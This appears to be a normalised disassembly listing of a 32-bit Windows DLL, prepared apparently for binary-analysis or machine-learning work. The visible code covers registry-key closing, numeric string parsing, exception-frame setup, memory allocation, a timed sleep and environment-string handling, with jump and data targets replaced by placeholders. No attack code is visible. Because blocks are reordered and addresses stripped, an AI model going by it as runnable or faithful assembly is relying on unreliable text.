cmp [ ebp - 0x30c ] 0x8
jb r-xdata
mov eax [ ebp - 0x328 ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x304 ]
push ecx
mov ecx [ ebp - 0x328 ]
push ecx
call [ RegCloseKey@IAT ]
lea edx [ ebp - 0x84 ]
push edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x84 ]
push edx
mov ecx esi
call sub_1005ddc0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x320 ]
push ecx
call sub_100187af
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_10054d00
sub_10056f45
push 0x60
mov eax sub_1008531c
call sub_1003fae8
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
mov [ ebp - 0x68 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_100188c2
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] eax
call sub_10034a80
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1000ff3d
push [ ebp - 0x60 ]
xor edi edi
inc edi
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x51 ] 0x0
call sub_100463af
test al al
jne r-xdata
push edi
push ecx
push [ ebp - 0x60 ]
push esi
push ebx
push [ ebp + 0x8 ]
call sub_1002b851
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_1004642f
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
push [ ebp - 0x60 ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x60 ]
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] cl
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
inc ebx
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_1005f1e2
cmp [ ebp - 0x58 ] 0x0
mov edi [ ebp - 0x60 ]
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x38 ] ecx
jne r-xdata
mov [ ebx ] 0x2d
push edi
mov ecx esi
call sub_100463af
test al al
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x52 ] al
mov [ ebp - 0x52 ] cl
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ebx [ ebp - 0x58 ]
push edi
mov ecx esi
call sub_100463af
test al al
je r-xdata
call sub_1002f11b
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1005f1e2
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor ebx ebx
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_100405c0
push [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100463af
test al al
jne r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push edi
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1002c8c0
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1002c8c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
cmp [ esi + 0x5 ] 0x65
je r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
push [ ebp - 0x60 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_1005f1e2
push edi
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx 0x24
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
push edi
mov ecx esi
call sub_100463af
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x45
jne r-xdata
mov ecx esi
call sub_10045d3b
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
push edi
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10045d3b
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push edi
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10045d3b
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov al [ ebp - 0x52 ]
cmp [ esi + 0x5 ] al
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_10045d3b
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2b
jmp r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x51 ] 0x1
mov [ ebp - 0x51 ] 0x1
inc ebx
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
call sub_1004ca10
inc ebx
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_10045d3b
cmp [ ebp - 0x49 ] bl
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
push edi
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_10045d3b
inc [ ebp - 0x50 ]
mov ecx esi
call sub_1005f1e2
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_10045d3b
mov ecx esi
call sub_1005f1e2
push [ ebp - 0x60 ]
mov ecx esi
call sub_100463af
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax [ ebp - 0x50 ]
mov [ eax ] 0x2d
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_10045d3b
cmp ebx 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1005f1e2
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10045d3b
sub_100574f2
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1007f9ed
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10044649
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_100575c9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10013acc
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10057600
push ebp
mov ebp esp
sub esp 0x18
push esi
push edi
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] r--data
mov [ ebp - 0x8 ] 0x0
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push edi
push eax
mov [ ebp - 0x10 ] eax
call sub_1007f5d0
mov eax [ ebp + 0x8 ]
add esp 0xc
lea ecx [ ebp - 0x14 ]
push ecx
add eax 0x54
call sub_1006d780
mov eax [ ebp - 0x10 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call esi
pop esi
mov esp ebp
pop ebp
retn 0x4
push eax
call esi
sub_10057670
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0xc
or eax [ rw-data ]
push ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x8 ]
push ecx
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x4 ]
mov ecx [ rw-data ]
mov esi [ ebp - 0x8 ]
cmp edi ecx
ja r-xdata
mov eax [ rw-data ]
jb r-xdata
push 0x0
push 0x2710
push ecx
push eax
call sub_100845f0
push 0x0
push 0x2710
push edi
push esi
mov ebx eax
call sub_100845f0
sub ebx eax
push ebx
call [ Sleep@IAT ]
cmp esi eax
jae r-xdata
sub_10057713
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_10066a1a
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_10067d3a
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_1007fa90
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_1007fa90
cmp [ esi ] 0x3d
pop ecx
lea ebx [ eax + 0x1 ]
je r-xdata
push [ rw-data ]
call sub_10035d06
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_10067d3a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_10035d06
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_10057f0f
add esp 0xc
test eax eax
jne r-xdata
pop ecx
pop ebx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
add edi 0x4
sub_10057800
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
mov eax edx
push esi
mov [ ebp - 0x4 ] 0x0
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub eax esi
push eax
push edx
push 0x0
call sub_100074a0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_10021bf0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_10057850
mov eax [ edx + 0x4 ]
push esi
mov esi [ edx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
jbe r-xdata
mov ecx [ edx + 0x8 ]
sub ecx esi
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
push r--data
call sub_1000831a
pop esi
retn
push edi
mov esi ecx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi ecx
pop edi
jae r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
pop esi
jmp sub_10049640
mov ecx eax
cmp ecx eax
jae r-xdata
sub_100578b0
push ebp
mov ebp esp
sub esp 0x8
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
push ecx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x4 ]
push eax
call sub_10026eb0
mov ax [ ebp - 0x4 ]
add esp 0x14
mov esp ebp
pop ebp
retn
sub_100578e0
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100030fa
dec [ ebp + 0x18 ]
inc [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10057920
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ecx + 0x14 ]
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
mov edx [ esi + 0x10 ]
sub ebx eax
mov [ ebp - 0x4 ] 0x0
cmp edx ebx
jbe r-xdata
push 0xffffffff
push 0x0
push esi
call sub_10017b50
xor edx edx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
push eax
mov ecx edi
mov [ edi ] dx
call sub_100649e0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ esi + 0x14 ]
sub ebx edx
cmp ebx eax
jb r-xdata
push 0x0
push ecx
or eax 0xffffffff
call sub_1004c030
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov [ edi ] cx
push eax
mov ecx edi
call sub_100649e0
pop esi
mov eax edi
pop ebx
mov esp ebp
pop ebp
retn
sub_100579b0
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0x14 ]
add ecx 0x8
push ecx
mov [ edi ] eax
mov edx [ ebx ]
push ebx
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x10 ] edx
call sub_10026e29
mov esi eax
add esp 0x10
test esi esi
jg r-xdata
mov eax [ edi ]
mov ecx [ ebp + 0x10 ]
dec esi
sub ecx eax
cmp ecx esi
jge r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
test esi esi
jle r-xdata
mov edx [ ebp - 0x10 ]
pop edi
pop esi
mov [ ebx ] edx
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
push esi
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f5d0
add esp 0xc
add [ edi ] esi
sub_10057a60
push ebp
mov ebp esp
push 0xffffffff
push sub_10087531
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax 0x1
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
call sub_10065cb8
mov ecx [ edi + 0xf4 ]
sub ecx [ edi + 0xf0 ]
mov eax 0x92492493
imul ecx
mov eax [ ebp - 0x34 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
xor edx edx
div ecx
mov ecx [ edi + 0xf0 ]
add esp 0x4
push 0xffffffff
push ebx
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_1004efe0
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
lea edx [ ebp - 0x2c ]
push edx
push ebx
call sub_1004f0d0
add esp 0x8
cmp eax ebx
jne r-xdata
xor ebx ebx
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_100553e0
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
cmp eax [ ebp + 0x8 ]
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_100187af
add esp 0x4
sub_10057b80
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x22c ] eax
mov eax [ ebp + 0x8 ]
push eax
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x230 ] edx
call sub_100375e0
add esp 0x4
test eax eax
mov eax 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
lea edx [ ebp - 0x224 ]
call sub_10029b50
mov edi [ rw-data ]
cmp [ edi + 0x120 ] 0x0
je r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x208
lea ecx [ ebp - 0x21c ]
push 0x0
push ecx
call sub_1007f940
lea edx [ ebp - 0x220 ]
push edx
call sub_10065cb8
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
lea ebx [ ecx + eax + 0x1082c ]
add esp 0x10
mov ecx 0x104
lea eax [ ebp - 0x21c ]
xor esi esi
nop
test ecx ecx
jne r-xdata
add eax 0x2
dec ecx
jne r-xdata
mov edx 0x104
sub edx ecx
jmp r-xdata
mov esi 0x80070057
xor edx edx
cmp [ eax ] si
je r-xdata
jmp r-xdata
mov eax esi
test esi esi
js r-xdata
test eax eax
jne r-xdata
mov eax 0x104
sub eax edx
lea ecx [ ebp + edx * 2 - 0x21c ]
push ebx
mov edx 0x7fffffff
call sub_10072800
lea eax [ ebp - 0x224 ]
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
je r-xdata
lea edx [ ebp - 0x220 ]
push edx
call sub_10065cb8
mov ecx [ ebp - 0x220 ]
mov eax 0xcccccccd
mul ecx
mov eax [ edi + 0x120 ]
shr edx 0x3
imul edx edx 0xfffffff6
add ecx edx
mov [ ebp - 0x220 ] ecx
imul ecx ecx 0x208
add esp 0x4
lea ecx [ ecx + eax + 0x11c7c ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_1004e6c0
test eax eax
je r-xdata
lea ecx [ ebp - 0x224 ]
push ecx
mov esi 0x104
lea ebx [ ebp - 0x21c ]
call sub_1004e6c0
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
xor eax eax
call sub_10029b50
mov eax [ ebp - 0x22c ]
push edx
mov edx [ ebp - 0x228 ]
push eax
lea ecx [ ebp - 0x21c ]
push ecx
mov ecx [ ebp - 0x230 ]
push edx
mov edx [ ebp + 0x8 ]
call sub_10027a80
add esp 0x10
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x4
pop ebx
sub_10057d80
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10001e8b
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10001e8b
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1008239b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_10082352
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_10001e8b
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_10001e8b
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10082382
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
